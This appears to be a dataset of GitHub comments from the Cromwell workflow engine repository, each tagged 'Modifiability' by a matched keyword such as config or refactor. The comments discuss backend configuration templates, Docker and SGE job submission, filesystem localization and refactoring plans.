Modifiability,"Just to clarify -- this isn't currently not possible on the JES backend, only Local. However, Pipelines APIv2 would allow for more flexible delocalization.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3065#issuecomment-353106597:131,flexible,flexible,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3065#issuecomment-353106597,1,['flexible'],['flexible']
Modifiability,"Just wanted to re touch base on this quickly, since the :+1: were given I fixed a bug that prevented the ""filepassing.wdl"" from working on JES and updated the config template / README. Is updating the template enough to make any configuration change work when cromwell will redeploy ? Because several field names / location have been changed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-162623180:159,config,config,159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-162623180,2,['config'],"['config', 'configuration']"
Modifiability,"K.I.S.S. indeed. 👍 to the code diff. Your comments do help, but I'm still only at about 75% in understanding of what initialization actors can and cannot validate currently. I'm fine if folks file issues with example ""enhancements"" for the future. One could also write a large suite of tests with runtime attribute expressions that should and should not validate, but that's another ticket to be prioritized. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1240/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1240#issuecomment-236930516:218,enhance,enhancements,218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1240#issuecomment-236930516,1,['enhance'],['enhancements']
Modifiability,Kristian saw this again last night. I believe Henry made some config adjustments to up the limit in the Cromwell container and restarted.; ![image](https://user-images.githubusercontent.com/10790523/41095375-3a47e138-6a1f-11e8-8f14-19a3cb1b7d81.png),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3716#issuecomment-395378463:62,config,config,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3716#issuecomment-395378463,1,['config'],['config']
Modifiability,"Latest on aws_backend branch. ________________________________; From: mcovarr <notifications@github.com>; Sent: Thursday, June 7, 2018 6:47:04 AM; To: broadinstitute/cromwell; Cc: Thomas Dyar (EXTERNAL); Author; Subject: Re: [broadinstitute/cromwell] Strange ""Boxed Error"", probably authorization / config (#3736). Also what version of Cromwell is this?. —; You are receiving this because you authored the thread.; Reply to this email directly, view it on GitHub<https://urldefense.proofpoint.com/v2/url?u=https-3A__github.com_broadinstitute_cromwell_issues_3736-23issuecomment-2D395377185&d=DwMCaQ&c=n7UHtw8cUfEZZQ61ciL2BA&r=Wpxr3yZIgJUDc4CsPhUpuiAtTKDn_lya4DWla3Q21iI&m=vxqjxBUg7eYY0Pzk0lUj-fru5Fu_Xj93aim9v5CyjEk&s=U0Ofhj4NWKhfebpsRfeTCvMxBZRUhJ44bevIpm6SR-E&e=>, or mute the thread<https://urldefense.proofpoint.com/v2/url?u=https-3A__github.com_notifications_unsubscribe-2Dauth_AIfLudmaJuhICx-5FxkNqusXZWh8pJ14zvks5t6QSogaJpZM4UdPeJ&d=DwMCaQ&c=n7UHtw8cUfEZZQ61ciL2BA&r=Wpxr3yZIgJUDc4CsPhUpuiAtTKDn_lya4DWla3Q21iI&m=vxqjxBUg7eYY0Pzk0lUj-fru5Fu_Xj93aim9v5CyjEk&s=qPDfKyTsVifxuNzZbVjE9HCwrHl6ANQrTo9wh-9YTJE&e=>.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395392027:299,config,config,299,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395392027,1,['config'],['config']
Modifiability,"Let’s talk after standup. In this case I think the port that Cromwell itself is listening on works. > On Mar 8, 2018, at 10:40 PM, mcovarr <notifications@github.com> wrote:; > ; > There's code now on develop that looks at a config value. It's not clear from the discussion above if that's enough to satisfy this ticket?; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub, or mute the thread.; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371786829:224,config,config,224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371786829,1,['config'],['config']
Modifiability,"Local, metaGenPipe.taxonclass_task -> Local, qc_subworkflow.fastqc_task -> Local, metaGenPipe.multiqc_task -> Local; [2020-09-17 21:41:42,97] [error] Error parsing generated wdl:; task submit {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {; singularity run -B ${head_directory}:${head_directory} ${singularity_image} /bin/bash ${script}; }; }. task submit_docker {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String docker_cwd; String docker_cid; String docker_script; String docker_out; String docker_err. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait cat ${docker_cid}). # remove the container after waiting; docker rm cat ${docker_cid}. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill cat ${docker_cid}; }; }; java.lang.RuntimeException: Error parsing generated wdl:; task submit {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {; singularity run -B ${head_directory}:${head_directory} ${singularity_image} /bin/bash ${script}; }; }. task submit_docker {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:1867,config,configuration,1867,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['configuration']
Modifiability,"Looking at this with Cromwell 24, the user can be specified with a config like:. ```; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; String? docker; String? docker_user; """"""; submit-docker = """"""docker run --rm ${ ""--user "" + docker_user } -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash ${docker_cwd}/execution/script""""""; .; .; .; ```. The WDL can pass in `docker_user` as a runtime attribute, which could be an expression involving an input or just a hardcoded value. But even with a container path not under `/root`, there are currently permissions problems that prevent this from working due to the different users inside and outside the Docker container. It may be possible to `chmod` and `umask` our way past these problems, but I need to think through the security implications of doing so. Maybe making this more liberal behavior an opt-in configuration value in the backend config would be okay?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/472#issuecomment-271364535:67,config,config,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/472#issuecomment-271364535,6,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config', 'configuration']"
Modifiability,Looks good. When the SGE backend makes its much anticipated return there are some bits here that could probably be refactored to be shared. :+1:. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1170/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1170#issuecomment-233487066:115,refactor,refactored,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1170#issuecomment-233487066,1,['refactor'],['refactored']
Modifiability,"Looks like it's here ""https://github.com/broadinstitute/firecloud-develop/blob/dev/run-context/live/configs/cromwell/docker-compose.yaml.ctmpl"" so it means it'll get promoted automatically on next release.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3709#issuecomment-394768106:100,config,configs,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3709#issuecomment-394768106,1,['config'],['configs']
Modifiability,"Looks like one test is legit failing. ```; - should successfully run drs_wf_level_read_size *** FAILED *** (44 seconds, 659 milliseconds); centaur.test.CentaurTestException: Unexpected terminal status Failed but was waiting for Succeeded (workflow ID: 0f9eb46c-44ce-4c92-99f6-0184196298eb). Metadata 'failures' content: [; {; ""causedBy"" : [; {; ""causedBy"" : [; ],; ""message"" : ""Failed to evaluate 'wf_level_read_and_size.fileSize1' (reason 1 of 1): Evaluating size(input1) failed: java.lang.IllegalArgumentException: Could not build the path \""dos://wb-mock-drs-dev.storage.googleapis.com/4a3908ad-1f0b-4e2a-8a92-611f2123e8b0\"". It may refer to a filesystem not supported by this instance of Cromwell. Supported filesystems are: HTTP, Google Cloud Storage, LinuxFileSystem. Failures: \nHTTP: dos://wb-mock-drs-dev.storage.googleapis.com/4a3908ad-1f0b-4e2a-8a92-611f2123e8b0 does not have an http or https scheme (IllegalArgumentException)\nGoogle Cloud Storage: Cloud Storage URIs must have 'gs' scheme: dos://wb-mock-drs-dev.storage.googleapis.com/4a3908ad-1f0b-4e2a-8a92-611f2123e8b0 (IllegalArgumentException)\nLinuxFileSystem: Cannot build a local path from dos://wb-mock-drs-dev.storage.googleapis.com/4a3908ad-1f0b-4e2a-8a92-611f2123e8b0 (RuntimeException)\n Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems""; },. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5039#issuecomment-505086279:1330,config,configure,1330,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5039#issuecomment-505086279,1,['config'],['configure']
Modifiability,Looks like this error was specific to my runtime+configuration.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4186#issuecomment-425939282:49,config,configuration,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4186#issuecomment-425939282,1,['config'],['configuration']
Modifiability,"Looks like this was a bad error message, but the task works when I change my runtime+configuration.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4185#issuecomment-425939958:85,config,configuration,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4185#issuecomment-425939958,1,['config'],['configuration']
Modifiability,"Makes sense. This can wait for the official announcement of which way the feature is going. In the meantime, our users are gradually migrating from on-prem to Terra. Our Cromwell instance allows users to run workflows on GCP or GridEngine. We want to ensure our instance has feature parity with launching workflows in Terra, so we needed something like this commit. After the announcement, I'll update the PR to copy these auth config lines over to the Batch backend. Otherwise, Terra will have removed the checkbox for reference disks and we can close the PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2107730127:428,config,config,428,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2107730127,1,['config'],['config']
Modifiability,"Managed to fix the problem. Cromwell 32 errorred and explained the problem. The filesystem section was moved to the SGE section. Are config file now looks like this:; ```HOCON; backend {; default=""SGE""; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10000; runtime-attributes= """"""; Int? cpu=1; Int? memory=4; """"""; submit = """"""; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe BWA ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${out} \; -e ${err} \; ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [ ""soft-link"", ""copy"", ""hard-link"" ]; hashing-strategy: ""file""; }; }; }; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-402984197:133,config,config,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-402984197,4,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,Manually rebased onto `develop` to address missing circle config,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6169#issuecomment-777841131:58,config,config,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6169#issuecomment-777841131,1,['config'],['config']
Modifiability,Maybe the default application.conf should start with Local FS instead of GCS by default - since we want it to be a pick-up-and-play config?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/824#issuecomment-218835359:132,config,config,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/824#issuecomment-218835359,1,['config'],['config']
Modifiability,Maybe this is a workaround till there is a actor pool in place to replace this? Tested this on SGE and it seems to work. Now isAlive is only executing a shell command once each 20 seconds. This 20 seconds can maybe be inside the config but first want to know what you guys think of this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243102881:229,config,config,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243102881,1,['config'],['config']
Modifiability,"Maybe, having a whitelist of config values for which ""get a config value"" is allowed, could work? E.g. backend.providers.Local.config.root is not under \*.filesystems.\* .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4317#issuecomment-433250321:29,config,config,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4317#issuecomment-433250321,3,['config'],['config']
Modifiability,Might be nice to disable this by setting the refresh duration (which is already a config value) to zero (or infinite),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245940665:82,config,config,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245940665,1,['config'],['config']
Modifiability,"Minor ""main"" code edits. The ""test"" code can maybe stay as is for now, as I expect more changes as the scatter code evolves next sprint. With the ""main"" code changes and a rebase, :+1: from me to merge.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/138#issuecomment-132619102:116,evolve,evolves,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/138#issuecomment-132619102,1,['evolve'],['evolves']
Modifiability,"More details that emerged over the past couple weeks:. In the past, the Local and JES backends extended the ABJEA. When the Local and JES backends were merged into Standard, there was a lot of work in the Standard not to mess with the existing ABJEA. This turns out to have not been necessary. The only known extension of the ABJEA is now the Standard implementation, the `StandardAsyncExecutionActor` (SAEA). Thus, one is now free to merge the SAEA and ABJEA, and remove the promises-of-results, futures-of-handles, etc. with a simplified actor/fsm. Similarly, while there is a Standard actor that extends the `BackendJobExecutionActor` (BJEA), this isn't necessary either! As the actors are untyped, any implementation that receives and responds to correct messages will work. Thus the `StandardSyncExecutionActor` (SSEA) could be refactored also, and even merging the SSEA and the SAEA into a single actor/fsm. Also, when considering rewrites, it was also noted that the term ""sync/async"" in the SSEA/SAEA names were confusing. Possible alternatives were StandardFutureExecutionActor / StandardMessagingExecutionActor. Again this may be moot if the actors are merged into a single actor.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1218#issuecomment-289853897:95,extend,extended,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1218#issuecomment-289853897,4,"['extend', 'refactor', 'rewrite']","['extended', 'extends', 'refactored', 'rewrites']"
Modifiability,"More info on the current issue:; - The local backend, running on the Config backend, supports running commands with or without docker.; - However the Config backend only allows `run-in-background` to be set for _both_ with and without docker.; - When `run-in-background` is set to true, the process id of the backgrounded process is stored for later killing.; - One cannot halt a docker container using [just `kill`](https://www.fpcomplete.com/blog/2016/10/docker-demons-pid1-orphans-zombies-signals). This gets ignored by the linux kernal and leaves the container running:; > If you must send a SIGKILL to your process, use the docker kill command instead; - `docker kill` takes in the container id, not a pid.; - `docker run -d` outputs the container id, detaching the process.; - For this detached docker, one should set `run-in-background = false`, the opposite of Local without docker. Workaround-- make the runtime attribute ""docker"" mandatory and run docker in detached mode:. ```; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; run-in-background = false. runtime-attributes = """"""; String docker; String? docker_user; """""". submit-docker = """"""; docker run \; -d --rm \; ${""--user "" + docker_user} \; -v ${cwd}:${docker_cwd} \; ${docker} \; /bin/bash -c '/bin/bash ${script} > ${out} 2> ${err} < /dev/null'; """""". kill = ""docker kill ${job_id}""; check-alive = ""docker ps ${job_id}""; job-id-regex = ""([0-9a-f]+)""; }; }; ```. Actual fix-- Refactor the config backend, better separating the docker vs. non-docker config. Only `submit` vs. `submit-docker` are differentiated currently, but `run-in-background`, `job-id-regex`, `kill`, etc. are all different for docker vs. non-docker. **TL;DR: The local backend should run the docker container in the background, capture the docker container id from stdout, and later issue a `docker kill <container id>`.**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1126#issuecomment-282569453:69,Config,Config,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1126#issuecomment-282569453,8,"['Config', 'Refactor', 'config']","['Config', 'ConfigBackendLifecycleActorFactory', 'Refactor', 'config']"
Modifiability,"More info on this--there is no region in the cromwell config file, and us-west-2 is specified in ~/.aws/config. Also us-east does not occur in any of the WDLs or json files. So I believe cromwell is _supposed_ to use whatever's set in ~/.aws/config. . Here's an example of where the metadata says the region is us-east-1:. ```; ""runtimeAttributes"": {; ""failOnStderr"": ""false"",; ""queueArn"": ""arn:aws:batch:us-west-2:xxx:job-queue/cromwell-1999"",; ""disks"": ""local-disk /cromwell_root"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""quay.io/fhcrc-microbiome/picard:2.20.1"",; ""maxRetries"": ""1"",; ""cpu"": ""4"",; ""cpuMin"": ""1"",; ""noAddress"": ""false"",; ""zones"": ""us-east-1a"",; ""memoryMin"": ""2 GB"",; ""memory"": ""4 GB""; },; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-492893146:54,config,config,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-492893146,3,['config'],['config']
Modifiability,"Much like the sample config presented in #472, the config backend system should allow for passing memory and cpu options something like this:. ```; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; String? docker; Integer? docker_memory; Integer? docker_cpu; """"""; submit-docker = """"""docker run --rm ${ ""--memory "" + docker_memory } ${ ""--cpuset-cpu "" + docker_cpu } -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash ${docker_cwd}/execution/script""""""; .; .; .; ```. But environment variables are a bit trickier. There doesn't currently seem to be a nice way in WDL of composing a string like`-e key1=value1 -e key2=value2`. I've started working up a proposal over [here](https://github.com/broadinstitute/wdl/pull/84) for one way WDL might support this; feel free to chime in there! 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/375#issuecomment-271619712:21,config,config,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/375#issuecomment-271619712,6,"['Config', 'config', 'variab']","['ConfigBackendLifecycleActorFactory', 'config', 'variables']"
Modifiability,"My admin has added the policy serviceusage.services.use to my Service Account, whatever that means (I have no idea). Now I get this error:; ```; [2020-07-27 19:13:48,68] [error] PipelinesApiAsyncBackendJobExecutionActor [bf8fa2c2wf_hello.hello:NA:1]: Error attempting to Execute; java.io.IOException: Scopes not configured for service account. Scoped should be specified by calling createScoped or passing scopes to constructor.; 	at com.google.auth.oauth2.ServiceAccountCredentials.refreshAccessToken(ServiceAccountCredentials.java:402); 	at com.google.auth.oauth2.OAuth2Credentials.refresh(OAuth2Credentials.java:157); 	at com.google.auth.oauth2.OAuth2Credentials.getRequestMetadata(OAuth2Credentials.java:145); 	at com.google.auth.oauth2.ServiceAccountCredentials.getRequestMetadata(ServiceAccountCredentials.java:603); 	at com.google.auth.http.HttpCredentialsAdapter.initialize(HttpCredentialsAdapter.java:91); 	at com.google.api.client.http.HttpRequestFactory.buildRequest(HttpRequestFactory.java:88); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:423); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:399); 	at cromwell.backend.google.pipelines.v1alpha2.GenomicsFactory$$anon$1.runRequest(GenomicsFactory.scala:85); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline(PipelinesApiRunCreationClient.scala:53); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline$(PipelinesApiRunCreationClient.scala:48); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.runPipeline(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$createNewJob$19(PipelinesApiAsyncBackendJobExecutionActor.scala:572); 	at scala.concurrent.Futur",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629:312,config,configured,312,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629,1,['config'],['configured']
Modifiability,"My baseline for these kinds of refactor is ""does it pass our test suites""... so 👍 but only once you've got all that sorted out. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1977/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1977#issuecomment-279423967:31,refactor,refactor,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1977#issuecomment-279423967,1,['refactor'],['refactor']
Modifiability,"My task are not using docker. Also I see no attempts at all to copy or softlink the files. Not in the log, and not in the cromwell-executions folder.; Also hard-linking seems to persist using the `SGE` backend. Even though the localization has the same configuration as above. So the error is not backend specific. Fortunately, all the other values in the config are used. Which makes me think that either my configuration file has some error (keys in wrong place). But I have checked this over and over again already with the example files and it seems to be correct (though I am not infallible of course).; Or the backend just ignores the values due to a bug.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-356221440:253,config,configuration,253,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-356221440,3,['config'],"['config', 'configuration']"
Modifiability,"My view of difficulty has only increased. You could narrow it down to a subset of things - . - Nothing in the backend; - Nothing in the service registry; - In the future, nothing involving filesystems. And it'd be easy to do. But most of the stuff people will be fiddling with are in those blocks. One could set up maybe some service (not necessarily ServiceRegistry service)where things which care about config register themselves and then process htings that way but that seems like a giant pain in the ass for not enough gain.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1598#issuecomment-325490308:405,config,config,405,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1598#issuecomment-325490308,1,['config'],['config']
Modifiability,"NOTE: depending on reviewer comments, will log TODOs as new tickets, or continue to try and refactor for this PR",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/566#issuecomment-197415719:92,refactor,refactor,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/566#issuecomment-197415719,1,['refactor'],['refactor']
Modifiability,"New `languages` config style:; ```. languages {; WDL {; versions {; ""draft-2"" {; language-factory = ""languages.wdl.WdlDraft2LanguageFactory""; }; }; }; CWL {; versions {; ""v1.0"" {; language-factory = ""languages.cwl.CwlV1LanguageFactory""; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3211#issuecomment-361667890:16,config,config,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3211#issuecomment-361667890,1,['config'],['config']
Modifiability,"Nice work! I'll answer questions before reviewing line-by-line in case it leads to changes. 1. `-e` is for exclude. There is a `papi_v2beta_gcsa.test` that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one).; 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid.; 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately`, it does seem like we may want the `false` behavior because it's responsible for some finalization activities around the job.; 4. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination).; 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130:269,config,configuration,269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130,1,['config'],['configuration']
Modifiability,No conformance tests enabled? I'm in a similar predicament over on my Wash U branch where I want to refactor a bunch of stuff but there are no tests to keep me honest. 😢,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3438#issuecomment-374715372:100,refactor,refactor,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3438#issuecomment-374715372,1,['refactor'],['refactor']
Modifiability,"No current opinions on further refactoring DataAccess, as those discussions are outside of the parent PR, though happy participate in a tech talk if desired. I will admit I ""started it"" by embellishing beyond simply inverting the futures within `runTransactionWithRollbackRetry`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/690#issuecomment-208375082:31,refactor,refactoring,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/690#issuecomment-208375082,1,['refactor'],['refactoring']
Modifiability,"No worries. I'll submit a later suggestion inside a code PR. There would be no traits under `package cromwell.database.sql.tables`, because MySQL, HSQLDB, etc. don't have traits. I'm desperately trying to keep the `database` layer modeling what's-in-the-database, versus modeling what-cromwell-would-like-to-see, ahead of Slick 4, doobie, or any other refactorings.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1350#issuecomment-242928077:352,refactor,refactorings,352,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1350#issuecomment-242928077,1,['refactor'],['refactorings']
Modifiability,"No, the part that fails isn't part of the WDL. See how the line I mentioned is setting a bash variable? Cromwell does this for each input variable, so that it can run the bash section with those variables. This issue is in the script that's generated for submission to the PAPI",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4393#issuecomment-440062650:94,variab,variable,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4393#issuecomment-440062650,3,['variab'],"['variable', 'variables']"
Modifiability,"Not 100% sure what wasn't working at what point. I suspect that based on the order of the original commits<sup>1</sup>, the `RunMysql` and server should have both worked at ""4."". At that point I believe the config `url` still contained `useSSL=true`, the application config was being passed on the command line, and the mysql jdbc code should have been in the main assembly. By the time I was running ""11."" earlier today, the configuration `url` no longer contained `useSSL=true`, and connections within `SlickDataAccess` were returning the error combo:. ```; java.sql.SQLTimeoutException: Timeout after 1000ms of waiting for a connection.; ...; Caused by: java.sql.SQLException: Access denied for user '…'@'…' (using password: YES); ```. I did add another variable in ""11."" by always testing with `useSSL=true&requireSSL=true`, but according to the [logs](http://pastebin/209) of the latest 'RunMysql', `jdbcMain` and `jdbcRequireSsl` passed. So that _shouldn't_ have changed the results. Meanwhile, all test combinations of setting ssl worked for both slick and raw datasource connections, in tests via the url (*Ssl*), or via the dataSource properties (*Prop). So I think just setting back the `useSSL=true` is the minimum required fix, but I'd prefer to see `requiredSSL=true` added as well, as was successfully run in `slickSslDriver`. <sup>1</sup> What I believe is the previous order of the commits:; 1. Updated run.sh to pass in the mysql key & trust stores.; 2. log database config; 3. make mysql not test-only; 4. Add config file option in run.sh to make container use custom configuration; 5. debugging ""script""; 6. log actual uniquified config; 7. Test at JDBC level.; 8. 